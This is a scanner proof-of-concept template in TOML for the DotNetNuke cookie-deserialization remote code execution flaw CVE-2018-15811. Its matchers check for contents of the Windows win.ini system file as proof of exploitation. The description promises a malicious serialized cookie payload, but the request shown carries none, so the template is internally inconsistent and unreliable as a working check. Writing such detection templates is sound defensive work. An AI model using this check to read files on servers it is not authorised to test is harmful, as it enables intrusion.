[info]
author = "AVE"
description = "DNN (DotNetNuke) 9.2至9.2.1版本使用弱加密算法保护输入参数，攻击者可构造恶意DNNPersonalization Cookie触发反序列化，实现远程代码执行。发送包含恶意序列化载荷的HTTP请求，通过读取目标文件内容验证漏洞存在。"
id = "POC-AVE-2018-0406"
name = "DNN (DotNetNuke) 弱加密与Cookie反序列化RCE PoC"
severity = "high"
tags = [
    "cve-2018-15811",
    "dotnetnuke",
    "deserialization",
    "rce",
]
vuln_id = [
    "CVE-2018-15811",
    "AVE-2018-0406",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/__"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[extensions]",
    "for 16-bit app support",
]

[[poc.requests.matchers]]
expect = true
status = [404]
type = "status"
